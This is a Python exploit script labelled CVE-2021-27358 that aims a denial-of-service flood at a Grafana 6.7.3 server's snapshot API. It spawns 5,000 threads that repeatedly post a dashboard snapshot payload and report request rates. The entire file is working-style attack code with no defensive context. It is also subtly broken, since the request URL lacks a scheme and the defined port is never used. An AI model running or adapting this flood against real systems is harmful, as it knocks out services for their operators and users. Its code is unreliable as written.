#!/usr/bin/env python
# CVE-2021-27358 - Grafana 6.7.3 Snapshot DoS
import requests, threading, time, sys, json

TARGET = "localhost"
PORT = 3000
THREADS = 5000
DURATION = 30

running = True
count = 0

PAYLOAD = {
    "dashboard": {
        "editable": False,
        "hideControls": True,
        "nav": [{"enable": False, "type": "timepicker"}],
        "rows": [{"panels": [{"id": 1, "type": "graph", "targets": [{"expr": "up"}]}]}],
        "style": "dark", "tags": [], "templating": {"list": []},
        "time": {"from": "now-5m", "to": "now"},
        "timezone": "browser", "title": "dos_test", "version": 5
    },
    "expires": 86400
}

HEADERS = {"Content-Type": "application/json", "Accept": "application/json"}

def attack():
    global count
    sess = requests.Session()
    sess.headers.update(HEADERS)
    while running:
        try:
            sess.post(TARGET + "/api/snapshots", data=json.dumps(PAYLOAD), timeout=5)
            count += 1
        except:
            pass

for _ in range(THREADS):
    t = threading.Thread(target=attack, daemon=True)
    t.start()

print("[*] Running...")
start = time.time()
try:
    while DURATION == 0 or time.time() - start < DURATION:
        time.sleep(1)
        e = time.time() - start
        sys.stdout.write("\r[%5.0fs] %d requests (%d/s)" % (e, count, count/e))
        sys.stdout.flush()
except KeyboardInterrupt:
    pass
finally:
    running = False
    print("\n[+] Done. %d requests sent." % count)
